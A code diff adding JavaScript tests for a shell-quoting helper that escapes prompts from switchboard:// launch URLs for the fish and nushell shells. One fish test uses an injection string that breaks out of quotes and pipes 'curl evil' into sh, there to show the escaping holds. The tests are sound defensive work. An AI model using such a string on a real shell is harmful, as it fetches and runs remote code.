@@ -5,6 +5,7 @@ const os = require('os');
 const path = require('path');
 
 const { ensureLaunchToken, parseLaunchUrl } = require('../url-launch');
+const { quoteArgForShell } = require('../shell-profiles');
 
 function tmpDir() {
   return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'url-launch-')));
@@ -119,4 +120,17 @@ test('decodes the percent-encoded URL the brief server sends', () => {
   const url = `switchboard://new?path=${encodeURIComponent(project)}&prompt=${encodeURIComponent('regel 1\nregel "2" & meer')}&token=secret`;
   const result = parseLaunchUrl(url, options);
   assert.equal(result.prompt, 'regel 1\nregel "2" & meer');
+});
+
+// The prompt of a switchboard://new URL comes from outside the app and is
+// quoted onto the shell command line. These lived in schedule-injection.test.js,
+// which upstream removed with the old schedule runner.
+test('quoteArgForShell keeps backslashes and quotes literal in fish', () => {
+  assert.equal(quoteArgForShell('/opt/homebrew/bin/fish', "x\\' ; curl evil | sh ; echo '"), "'x\\\\\\' ; curl evil | sh ; echo \\''");
+  assert.equal(quoteArgForShell('/opt/homebrew/bin/fish', 'ends in \\'), "'ends in \\\\'");
+});
+
+test('quoteArgForShell uses a raw string in nushell that the value cannot close', () => {
+  assert.equal(quoteArgForShell('/usr/local/bin/nu', "it's"), "r#'it's'#");
+  assert.equal(quoteArgForShell('/usr/local/bin/nu', "a'## b"), "r###'a'## b'###");
 });
